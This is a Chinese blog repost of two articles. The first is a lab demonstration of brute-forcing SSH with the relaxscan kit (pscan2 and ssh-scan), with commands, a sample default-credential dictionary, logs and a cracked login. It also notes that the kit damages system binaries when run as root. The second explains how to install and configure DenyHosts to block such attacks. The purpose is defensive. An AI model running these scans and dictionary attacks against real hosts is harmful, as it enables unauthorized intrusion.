---
layout: post
title:  "演示使用relaxscan暴力破解SSH &amp; 使用DenyHosts 阻止SSH暴力破解"
date:   2011-07-13 16:42:25
author: iGFW
categories: program
---

## 演示使用relaxscan暴力破解SSH &amp; 使用DenyHosts 阻止SSH暴力破解
### by iGFW
### at 2011-07-13 16:42:25
### original <http://igfw.tk/archives/3813>

<p><strong>演示使用relaxscan暴力破解SSH</strong></p>
<p>由于安全意识不足，导致机器被入侵的例子多不胜数。最近不断接到有服务器被入侵，执行文件被修改的报障。原因大多都是因为开放了SSH服务，同时 允许root访问，密码又过于简单的情况。为提出更有效的防范办法，决定做个攻击模拟。以下使用的工具是relaxsan，从网上可以很方便的找到，为免 影响不好，我这里就不提供了，仅做个攻击演示。<a name="entrymore"></a></p>
<p><strong><span></span>一、获取工具</strong><br>
首先，我不知道为什么叫relaxscan，这东西是从Google搜的，来源自chinaunix某个博客中，某被入侵所提取的代码。<br>
里面包括pscan2和ssh-scan这两个关键程序，及一些必须的文件：</p>
<div>
<div>引用</div>
<div>pscan2 端口扫描工具，可对指定的网段中的IP，进行特定端口的扫描，找到满足要求的服务器后，会这些服务器IP记录到文件中；<br>
ssh-scan 对指定的服务器进行暴力破解，其需要以下几个文件：<br>
mft.txt 攻击的服务器IP列表，可由pscan2获得，每个IP一行；<br>
pass_file 攻击用字典文件，每行由用户名+空格+密码组成，由ssh-scan自行调用，用于尝试进入ssh访问；<br>
vuln.txt 成功入侵目标主机后的记录文件，会标注那些机器通过什么用户名和密码可以进入。</div>
</div>
<p><strong>二、攻击演示</strong><br>
<strong>1、演示服务器</strong></p>
<div>
<div>引用</div>
<div>hacker：10.10.10.1/24 → 作为攻击端<br>
target：10.10.10.10/24 →作为被攻击目标</div>
</div>
<p><strong>2、创建一个普通用户</strong><br>
这步很重要，虽然没有pscan2的源码，但基本可以肯定的是，pscan2本身具有木马的特性。<strong>千万不要以root用户执行pscan2，记住！</strong>（网上有似乎有该程序的源码，但我不能肯定是否一样，但在后面的补充内容中，我会做个简单的测试，以说明这问题。）</p>
<div># useradd test<br>
# passwd test</div>
<p><strong>3、扫描特定网段</strong><br>
切换到test用户，把relaxscan解压出来，给pscan2 赋予可执行权限：</p>
<div>
<div>引用</div>
<div># su – test<br>
$ id<br>
uid=512(test) gid=512(test) groups=512(test)<br>
$ cd relaxscan/<br>
$ chmod +x pscan2</div>
</div>
<p>pscan2 的用法：</p>
<div>
<div>引用</div>
<div>$ ./pscan2<br>
Usage: ./pscan2 [c-block]<br>
第一个参数是给出扫描的网段，必须是B类型的；<br>
第二个参数是扫描的端口；<br>
第三个参数是可选的，可进一步限制上面B类型网段中的C 段范围；</div>
</div>
<p>扫描10.10.10 网段：</p>
<div>
<div>引用</div>
<div>$ ./pscan2 10.10 22 10<br>
# scanning:<br>
# pscan completed in 3 seconds. (found 2 ips)<br>
$ cat 10.10.10.pscan.22<br>
10.10.10.1<br>
10.10.10.10</div>
</div>
<p>可见，找到该网段中有两个IP打开了SSH服务。</p>
<p><strong>4、攻击特定IP的SSH服务</strong><br>
既然找到已打开SSH服务的机器IP，那就可以用ssh-scan 进行暴力破解了。破解的关键是字典文件pass_file ，该文件决定了攻击时间的长短和成功率。可以从网上获取一堆的字典，下面是我模拟的几个用户名和密码：</p>
<div>
<div>引用</div>
<div>$ cat pass_file<br>
upload upload<br>
root q1w2e3r4<br>
root qwer1234<br>
root qwer0987<br>
root poiu7890<br>
oracle oracle<br>
ftp ftp<br>
apache apache<br>
nagios nagios<br>
nginx nginx<br>
lighttpd lighttpd<br>
mysql mysql<br>
postfix postfix</div>
</div>
<p><strong>※ 千万不要忽视普通用户的登录，普通用户可通过一些root exploit 漏洞提升到root权限，届时，与通过root访问也没什么差别。</strong><br>
把上面通过pscan2得到的IP地址段，转存为mfu.txt文件，然后开始攻击：</p>
<div>
<div>引用</div>
<div>$ grep -v -w ’10.10.10.1′ 10.10.10.pscan.22 &gt; mfu.txt<br>
$ ./ssh-scan 100<br>
Toata dragostea mea pentru diavola!!!!!!</div>
</div>
<p>在被攻击端的安全日志中，会显示大量的尝试记录，类似：</p>
<div>
<div>引用</div>
<div>Jul  8 12:00:33 asianux3 sshd[2488]: Invalid user upload from 10.10.10.1<br>
Jul  8 12:00:33 asianux3 sshd[2489]: input_userauth_request: invalid user upload<br>
Jul  8 12:00:33 asianux3 sshd[2488]: pam_unix(sshd:auth): check pass; user unknown<br>
Jul  8 12:00:33 asianux3 sshd[2488]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=10.10.10.1<br>
Jul  8 12:00:33 asianux3 sshd[2488]: pam_succeed_if(sshd:auth): error retrieving information about user upload<br>
Jul  8 12:00:36 asianux3 sshd[2488]: Failed password for invalid user upload from 10.10.10.1 port 2000 ssh2<br>
Jul  8 12:00:36 asianux3 sshd[2489]: Received disconnect from 10.10.10.1: 11: Bye Bye<br>
……<br>
Jul  8 12:00:44 asianux3 sshd[2499]: Accepted password for oracle from 10.10.10.1 port 2005 ssh2<br>
Jul  8 12:00:44 asianux3 sshd[2499]: pam_unix(sshd:session): session opened for user oracle by (uid=0)</div>
</div>
<p>攻击的密度与您给ssh-scan提供的参数有关，参数越大，尝试越频繁。从上面的日志可看到，oracle用户尝试登录成功了。<br>
在攻击端也会显示信息：</p>
<div>
<div>引用</div>
<div>$ L-amPrins… !! -&gt;oracle:oracle:10.10.10.10</div>
</div>
<p>并记录在vuln.txt 文件中：</p>
<div>
<div>引用</div>
<div>$ cat vuln.txt<br>
oracle:oracle:10.10.10.10</div>
</div>
<p>至此，攻击算是完成了。后续的，就是用该用户登录ssh，然后尝试exploit 到root等操作，这里不再叙述。</p>
<p><strong>三、破坏系统可执行文件</strong><br>
本来，我是希望通过这次的模拟，产生类似下面的病毒文件：<br>
<a href="http://www.linuxfly.org/attachment.php?fid=1037"><img title="点击在新窗口中浏览此图片" src="http://www.linuxfly.org/attachment.php?fid=1037" alt="点击在新窗口中浏览此图片" border="0"></a><br>
可惜没效果。但通过实验，发现pscan2和ssh-scan 确实是有问题的。<br>
<strong>1、原系统执行文件信息</strong><br>
找几个系统执行文件的当前信息：</p>
<div>
<div>引用</div>
<div># ll /bin/{more,cat,umount,cp,mv}<br>
-rwxr-xr-x 1 root root   25216 2010-03-02 /bin/cat<br>
-rwxr-xr-x 1 root root   70632 2010-03-02 /bin/cp<br>
-rwxr-xr-x 1 root root   35880 2010-03-25 /bin/more<br>
-rwxr-xr-x 1 root root   78680 2010-03-02 /bin/mv<br>
-rwsr-xr-x 1 root root   40432 2010-03-25 /bin/umount</div>
</div>
<p><strong>2、以root权限运行pscan2或ssh-scan</strong><br>
结果，系统中的一些执行文件被修改：</p>
<div>
<div>引用</div>
<div># ll /bin/{more,cat,umount,cp,mv}<br>
-rwxr-xr-x 1 root root 33408 07-08 12:34 /bin/cat<br>
-rwxr-xr-x 1 root root 78824 07-08 12:34 /bin/cp<br>
-rwxr-xr-x 1 root root 44072 07-08 12:34 /bin/more<br>
-rwxr-xr-x 1 root root 86872 07-08 12:34 /bin/mv<br>
-rwsr-xr-x 1 root root 48624 07-08 12:34 /bin/umount</div>
</div>
<p>这些文件都被加了8192字节（某些文件会加16384字节），导致这些文件损坏了：</p>
<div>
<div>引用</div>
<div># cp<br>
-bash: /bin/cp: cannot execute binary file<br>
# mv<br>
-bash: /bin/mv: cannot execute binary file<br>
# umount<br>
-bash: /bin/umount: cannot execute binary file</div>
</div>
<p>表现形式很像木马程序。而且这些都是基本的执行文件，结果就是系统异常，修复也很困难。幸亏没感染能力，不会大规模传播。<br>
一般可通过rpm -Va 找出被破坏的文件，然后重新安装对应的rpm包。但手续复杂，而且不能确保修复完整。<br>
<strong>所以，尝试relaxscan前，请务必小心哦！</strong></p>
<p> </p>
<p><strong>原文</strong>：<strong></strong><a href="http://www.linuxfly.org/post/611/">http://www.linuxfly.org/post/611/</a></p>
<p> </p>
<p><strong>使用DenyHosts 阻止SSH暴力破解</strong></p>
<p>把服务器挂上公网，不可避免的有病毒或无聊的人会尝试攻击SSH。DenyHosts 就是通过分析secure日志，把满足一定要求的IP记录到/etc/hosts.deny中，达到屏蔽这些有害IP的目的。<a name="entrymore"></a></p>
<p><strong>一、安装</strong><br>
官网：<a href="http://denyhosts.sourceforge.net/">http://denyhosts.sourceforge.net</a><br>
版本比较老，最新的是2.6，但还可用。</p>
<p>我修改了其提供的src.rpm，直接把系统服务/etc/init.d/denyhosts和默认配置文件denyhosts.cfg都加到rpm中：<br>
本地下载：</p>
<div>
<div><img src="http://www.linuxfly.org/template/meSimple/images/download.gif" alt="">下载文件</div>
<div><a href="http://www.linuxfly.org/attachment.php?fid=1036">点击这里下载文件</a></div>
</div>
<p>（适用于Asianux 3.0 python 2.4的版本，其他版本请用源码自行编译吧）</p>
<p>源码：</p>
<div>
<div><img src="http://www.linuxfly.org/template/meSimple/images/download.gif" alt="">下载文件</div>
<div><a href="http://www.linuxfly.org/attachment.php?fid=1035">点击这里下载文件</a></div>
</div>
<p>直接安装即可：</p>
<div># rpm -ivh /usr/src/asianux/RPMS/noarch/DenyHosts-2.6-2.qk.python2.4.noarch.rpm</div>
<p>启动：</p>
<div>
<div>引用</div>
<div># service denyhosts start<br>
starting DenyHosts:    /usr/bin/env python /usr/bin/denyhosts.py –daemon –config=/usr/share/denyhosts/denyhosts.cfg</div>
</div>
<p>日志：</p>
<div>
<div>引用</div>
<div># tail /var/log/denyhosts<br>
2011-07-07 16:03:37,390 – denyhosts   : INFO     launching DenyHosts daemon (version 2.6)…<br>
2011-07-07 16:03:37,395 – denyhosts   : INFO     DenyHosts daemon is now running, pid: 21872<br>
2011-07-07 16:03:37,396 – denyhosts   : INFO     send daemon process a TERM signal to terminate cleanly<br>
2011-07-07 16:03:37,396 – denyhosts   : INFO       eg.  kill -TERM 21872<br>
2011-07-07 16:03:37,399 – denyhosts   : INFO     monitoring log: /var/log/secure<br>
2011-07-07 16:03:37,399 – denyhosts   : INFO     sync_time: 3600<br>
2011-07-07 16:03:37,399 – denyhosts   : INFO     daemon_purge:      3600<br>
2011-07-07 16:03:37,399 – denyhosts   : INFO     daemon_sleep:      30<br>
2011-07-07 16:03:37,400 – denyhosts   : INFO     purge_sleep_ratio: 120<br>
2011-07-07 16:03:37,400 – denyhosts   : INFO     denyhosts synchronization disabled</div>
</div>
<p><strong>二、配置</strong><br>
配置文件在/usr/share/denyhosts/denyhosts.cfg，文件中有很详细的注释，自己看文档吧。这里转一份<a href="http://www.php-oa.com/2007/10/17/drop-ssh-denyhosts.html">扶凯</a>的说明（做点补充吧）：</p>
<div>
<div>引用</div>
<div>SECURE_LOG = /var/log/secure #ssh 日志文件，它是根据这个文件来判断的。HOSTS_DENY = /etc/hosts.deny #控制用户登陆的文件
<p>PURGE_DENY = 30m #过多久后清除已经禁止的IP，若留空，表示不清除任何HOSTS_DENY记录</p>
<p>BLOCK_SERVICE = sshd #禁止的服务名</p>
<p>DENY_THRESHOLD_INVALID = 1 #允许无效用户失败的次数</p>
<p>DENY_THRESHOLD_VALID = 3 #允许有效用户（除root外）登陆失败的次数</p>
<p>DENY_THRESHOLD_ROOT = 5 #允许root登陆失败的次数</p>
<p>HOSTNAME_LOOKUP=NO #是否做域名反解，默认是YES，最好改为NO</p>
<p>ADMIN_EMAIL =  #管理员邮件地址,它会给管理员发邮件</p>
<p>DAEMON_LOG = /var/log/denyhosts #自己的日志文件</p>
</div>
</div>
<p><strong>三、测试</strong><br>
找台机器，用ssh工具连接这台已打开DenyHosts服务的机器，用错误的密码尝试几次，即可在/var/log/denyhosts中看到类似的日志：</p>
<div>
<div>引用</div>
<div>2011-07-07 16:09:07,358 – denyhosts   : INFO     new denied hosts: [&#39;192.168.228.135&#39;]</div>
</div>
<p>同时，/etc/hosts.deny中也会加入该IP：</p>
<div>
<div>引用</div>
<div># tail -f /etc/hosts.deny<br>
# DenyHosts: Thu Jul  7 16:09:07 2011 | sshd: 192.168.228.135<br>
sshd: 192.168.228.135</div>
</div>
<p>若要手动允许该IP通过ssh访问，请把对应的IP从/etc/hosts.deny中删掉，然后，重启denyhosts服务即可。</p>
<p><strong>四、其他方法</strong><br>
sshfilter <a href="http://www.csc.liv.ac.uk/%7Egreg/sshdfilter/">http://www.csc.liv.ac.uk/~greg/sshdfilter/</a></p>
<p>Fail2Ban  <a href="http://fail2ban.sourceforge.net/">http://fail2ban.sourceforge.net/</a></p>
<p><a href="http://blog.csdn.net/zhongmao/article/details/2968088">使用pam_abl防止SSH遭暴力破解攻击</a></p>
<p> </p>
<p><strong>原文</strong>：<a href="http://www.linuxfly.org/post/610/">http://www.linuxfly.org/post/610/</a></p>